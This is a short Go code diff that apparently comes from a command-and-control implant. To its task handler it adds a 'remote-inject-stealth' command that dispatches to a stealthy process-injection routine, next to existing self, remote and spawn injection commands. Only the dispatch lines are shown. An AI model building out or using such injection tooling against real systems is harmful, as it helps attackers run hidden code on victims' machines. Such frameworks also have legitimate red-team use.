@@ -189,6 +189,8 @@ func ClientHandleTask(message []byte) (error, *data.TaskResult) {
 		result, cmdError = processinjection.RawSelfInject(t.File)
 	case "remote-inject":
 		result, cmdError = processinjection.RemoteInject(t.File, t.Args[0])
+	case "remote-inject-stealth":
+		result, cmdError = processinjection.RemoteInjectStealth(t.File, t.Args[0], t.Args[1])
 	case "spawn-inject":
 		result, cmdError = processinjection.SpawnInject(t.File, t.Args[0])
 	case "spawn-inject-pipe":
